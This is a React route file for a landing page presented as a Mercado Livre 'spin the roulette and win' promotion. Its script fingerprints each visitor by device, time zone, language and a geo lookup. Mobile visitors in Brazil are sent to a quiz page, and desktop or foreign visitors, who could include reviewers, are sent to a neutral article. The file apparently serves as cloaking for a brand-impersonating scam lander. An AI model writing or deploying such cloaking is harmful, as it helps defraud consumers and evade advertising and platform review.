import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Promoção Mercado Livre — Gire a Roleta e Ganhe" },
      {
        name: "description",
        content:
          "Participe do quiz, gire a roleta e desbloqueie ofertas exclusivas com preços promocionais em eletrônicos, eletrodomésticos e muito mais.",
      },
      { property: "og:title", content: "Promoção Mercado Livre — Gire a Roleta e Ganhe" },
      {
        property: "og:description",
        content:
          "Responda ao quiz rápido, gire a roleta e acesse a loja com descontos exclusivos.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Index,
});

function Index() {
  useEffect(() => {
    const qs = window.location.search || "";
    const go = (p: string) => window.location.replace(p + qs);

    const ua = navigator.userAgent || "";
    const isMobile =
      /Android|iPhone|iPod|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(ua) ||
      (/iPad|Macintosh/.test(ua) && "ontouchend" in document);

    if (!isMobile) {
      go("/artigo/");
      return;
    }

    let tz = "";
    try {
      tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
    } catch {
      tz = "";
    }
    const lang = (navigator.language || "").toLowerCase();
    const brHints =
      /America\/(Sao_Paulo|Bahia|Fortaleza|Recife|Belem|Manaus|Cuiaba|Campo_Grande|Porto_Velho|Boa_Vista|Rio_Branco|Maceio|Araguaina|Santarem|Noronha|Eirunepe)/.test(tz) ||
      lang.startsWith("pt");

    let done = false;
    const decide = (country: string | null) => {
      if (done) return;
      done = true;
      const isBR = country === "BR" || (!country && brHints);
      go(isBR ? "/quiz/" : "/artigo/");
    };

    const t = setTimeout(() => decide(null), 2500);
    fetch("/api/public/geo", { cache: "no-store" })
      .then((r) => r.json())
      .then((d: { country?: string | null }) => {
        clearTimeout(t);
        decide(d?.country ? String(d.country).toUpperCase() : null);
      })
      .catch(() => {
        clearTimeout(t);
        decide(null);
      });
  }, []);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background">
      <p className="text-sm text-muted-foreground">Carregando…</p>
    </div>
  );
}
